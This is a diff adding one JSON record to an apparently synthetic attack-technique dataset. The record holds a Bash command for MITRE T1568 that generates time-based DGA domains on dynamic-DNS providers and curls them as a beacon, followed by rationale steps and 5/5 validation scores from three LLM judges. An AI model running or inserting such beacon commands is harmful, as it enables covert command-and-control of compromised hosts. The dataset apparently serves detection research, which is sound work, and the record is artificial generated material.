@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(date -u +%Y%m%d%H%M%S)\"; sub=$(echo -n \"$seed\" | sha256sum | cut -c1-15); tld=$(printf \"ddns.net\\ndynu.net\\nduckdns.org\\nno-ip.org\" | awk \"NR==$(($(date -u +%S)%4+1))\"); dom=\"$sub.$tld\"; port=$(( 2000 + ($(date -u +%s) % 45000) )); curl --max-time 5 --connect-timeout 5 \"https://$dom:$port/v1/check\"",
+  "explanation": "Produces a per-second DGA subdomain and selects a provider TLD by current seconds, with a wide dynamic port range. This is dynamic resolution in line with T1568.",
+  "rationale_steps": [
+    "Use current UTC timestamp to seed a DGA hash.",
+    "Choose a provider TLD based on the current second.",
+    "Compute a variable port from epoch seconds.",
+    "Attempt a curl request to the dynamic endpoint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-40e050dc",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for curl, and correct variable assignments and manipulations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by generating time-based domain names with SHA256 hashing, rotating between four TLDs, calculating dynamic ports, and attempting to establish a connection to the algorithmically determined endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:05:14.327741Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses balanced quotes and parentheses, valid flags, and proper command separators, ensuring it is parseable and executable in Bash.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates T1568 by algorithmically generating a time-based DGA subdomain, dynamically selecting a TLD from common dynamic DNS providers, and using a wide dynamic port range to attempt C2 communication via HTTPS, embodying the spirit of rotating endpoints and dynamic resolution.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:05:23.957018Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and separators with valid pipelines, command and arithmetic substitutions, and correct curl flags make it well-formed in Bash.",
+        "semantic_score": 5,
+        "semantic_justification": "It deterministically generates time-based DGA subdomains, rotates among dynamic-DNS TLDs and ports, and attempts an HTTPS beacon, matching T1568 dynamic resolution behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:07:04.195272Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
